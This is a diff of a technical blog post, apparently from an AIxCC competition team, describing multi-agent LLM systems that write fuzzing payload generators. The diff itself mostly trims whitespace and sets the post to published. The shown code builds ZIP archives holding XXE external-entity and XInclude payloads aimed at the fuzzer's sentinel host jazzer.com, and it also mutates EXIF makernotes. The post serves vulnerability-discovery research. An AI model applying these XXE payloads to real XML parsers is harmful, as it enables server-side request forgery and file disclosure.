@@ -7,7 +7,7 @@ image: "/images/blog/mlla/bga_preview.png"
 categories: ["Atlantis-Multilang"]
 author: "Dongkwan Kim"
 tags: ["mlla", "llm", "exploit-generation", "multi-agent", "bga"]
-draft: true
+draft: false
 ---
 
 ## Why Programs Beat Payloads
@@ -35,7 +35,7 @@ def create_payload() -> bytes:
     zip_file = create_zip_structure()
     xml_content = inject_xxe_payload()
     manifest = generate_valid_manifest()
-    
+
     # Perfect format compliance every time
     return package_exploit(zip_file, xml_content, manifest)
 
@@ -194,14 +194,14 @@ def generate(rnd: random.Random) -> bytes:
     # ...
     # Phase 1: Create valid ZIP structure to reach parseRoot
     strategy = rnd.choice(['basic_xxe', 'xinclude', 'schema_ref', 'dtd_external'])
-    
+
     # Generate root filename
     root_filename = rnd.choice(['root.xml', 'data.xml', 'content.xml', 'main.xml'])
-    
+
     # Create Manifest.xml content
     manifest_content = f'''<?xml version="1.0" encoding="UTF-8"?>
 <manifest><Root>{root_filename}</Root></manifest>'''.encode('utf-8')
-    
+
     # Phase 2: Generate exploit payload based on strategy
     if strategy == 'basic_xxe':
         # XXE with external entity targeting jazzer.com
@@ -210,7 +210,7 @@ def generate(rnd: random.Random) -> bytes:
         root_content = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://jazzer.com:{port}{path}">]>
 <root>&xxe;</root>'''.encode('utf-8')
-    
+
     elif strategy == 'xinclude':
         # XInclude attack targeting jazzer.com
         path = rnd.choice(['/data.xml', '/config.xml', '/api/data', '/external.xml'])
@@ -219,28 +219,28 @@ def generate(rnd: random.Random) -> bytes:
 <root xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include href="{protocol}://jazzer.com{path}"/>
 </root>'''.encode('utf-8')
-    
+
     # ... (other strategies) ...
-    
+
     # Build ZIP file structure
     files = [
         ('Manifest.xml', manifest_content),
         (root_filename, root_content)
     ]
-    
+
     # Add random additional files occasionally
     if rnd.random() < 0.3:
         extra_content = b'<extra>data</extra>'
         files.append(('extra.xml', extra_content))
-    
+
     return create_zip(files, rnd)
 
 # ... (helper functions) ...
 ```
 
-**Why Generator Dominates:** 
+**Why Generator Dominates:**
 - **Probabilistic Success**: If attempt #7 fails but #13 succeeds, you still win
-- **Format Mastery**: Handles ZIP + XML + XXE simultaneously  
+- **Format Mastery**: Handles ZIP + XML + XXE simultaneously
 - **Strategic Variation**: Not random – intelligent exploration of attack space
 - **Coverage Merger**: Learns from ALL 20 variations, not just successes
 
@@ -277,30 +277,30 @@ The focused analysis loop concentrates on single function transitions, making it
 ```python
 def mutate(rnd: random.Random, seed: bytes) -> bytes:
     # ...
-    exif_pos = seed.find(b'Exif\x00\x00')    
+    exif_pos = seed.find(b'Exif\x00\x00')
     tiff_start = exif_pos + 6
     # ... (boundary checks) ...
-    
+
     makernote_pos = _find_makernote_start(seed, tiff_start)
     if makernote_pos == -1:
         makernote_pos = min(tiff_start + 64, len(seed))
-    
+
     prefix = seed[:makernote_pos]
     body = seed[makernote_pos:]
-    
+
     # 30% chance for generic mutations to maintain diversity
     if rnd.random() < 0.3:
         return _generic_mutate(rnd, seed)
-    
+
     # Apply format-specific mutations to Makernote section
     mutated_body = _mutate_makernote(rnd, body)
     result = prefix + mutated_body
-    
+
     return result[:min(len(result), 102400)]
 
 def _mutate_makernote(rnd, body):
     strategy = rnd.randint(0, 5)
-    
+
     if strategy == 0:
         return _mutate_signature(rnd, body)
     elif strategy == 1:
@@ -354,7 +354,7 @@ Looking back, several key innovations emerged that we believe enabled these disc
 
 ```python
 # Traditional approach often fails:
-perfect_payload = generate_perfect()  
+perfect_payload = generate_perfect()
 
 # Multi-variation approach: try systematic alternatives
 for i in range(20):
@@ -370,7 +370,7 @@ for i in range(20):
 These innovations proved especially effective against the types of vulnerabilities we encountered, which shared several challenging characteristics:
 
 - **Format Complexity**: Multi-layer format requirements (valid ZIP containing valid XML containing valid XXE) that challenge traditional random approaches
-- **Semantic Requirements**: Understanding that specific functions execute commands or that certain values trigger vulnerabilities  
+- **Semantic Requirements**: Understanding that specific functions execute commands or that certain values trigger vulnerabilities
 - **Precision Constraints**: Exact checksums, specific string patterns, correct binary structures
 - **Multiple Valid Attack Paths**: Different strategies leading to the same vulnerability
 
@@ -395,7 +395,7 @@ Perhaps our most transformative insight was realizing that the best way to get w
 We quickly learned that coordinating multiple LLM agents creates entirely new classes of problems that simply don't exist in single-agent systems. Building effective multi-agent orchestration required breakthroughs in several areas:
 
 - **Fault Isolation** is critical – one agent's failure cannot cascade to others, requiring careful async error handling
-- **Resource Management** through semaphore-based concurrency control prevents system exhaustion while maintaining parallelism  
+- **Resource Management** through semaphore-based concurrency control prevents system exhaustion while maintaining parallelism
 - **Context Transformation** requires tailoring information for each agent's specialized needs rather than broadcasting everything
 - **Intelligent Filtering** eliminates redundant work across agents to avoid wasting computational resources
 - **Work Distribution** requires understanding each agent's strengths and dispatching appropriate vulnerability contexts
@@ -422,13 +422,13 @@ BGA's success in AIxCC revealed something important: **we already have incredibl
 Looking at our current pipeline, we have access to rich information that most LLM systems can only dream of:
 
 - **Testlang structure** from our harness analysis
-- **Dictgen tokens** and existing dictionary patterns in the repo  
+- **Dictgen tokens** and existing dictionary patterns in the repo
 - **Concolic constraints** from our symbolic execution tools
 - **Call graphs** from CPUA providing precise function relationships
 - **Bug information (BITs)** from BCDA with detailed vulnerability context
 - **Plus many other analysis tools** feeding structured data
 
-The realization hit us: we may not be utilizing these context sources effectively. 
+The realization hit us: we may not be utilizing these context sources effectively.
 
 ### Context Engineering: The Next Frontier
 
@@ -442,7 +442,7 @@ This points to a massive opportunity: **context engineering**. People talk about
 
 ### The Questions Driving Us Forward
 
-- **Context Optimization**: How can we effectively structure all this rich information? 
+- **Context Optimization**: How can we effectively structure all this rich information?
 - **Beyond Fuzzing**: Can we build a full exploit agent for CTF targets (like XBOW) or real-world vulnerabilities without harnesses?
 - **Memory Utilization**: Can we tap into LLMs' knowledge base like humans recall memories? They already know about Java's ServletFileUpload, repository patterns, and common vulnerability classes
 - **Intermediate Representations**: Is there an LLM-friendly structure for representing code, bugs, and exploitation context?
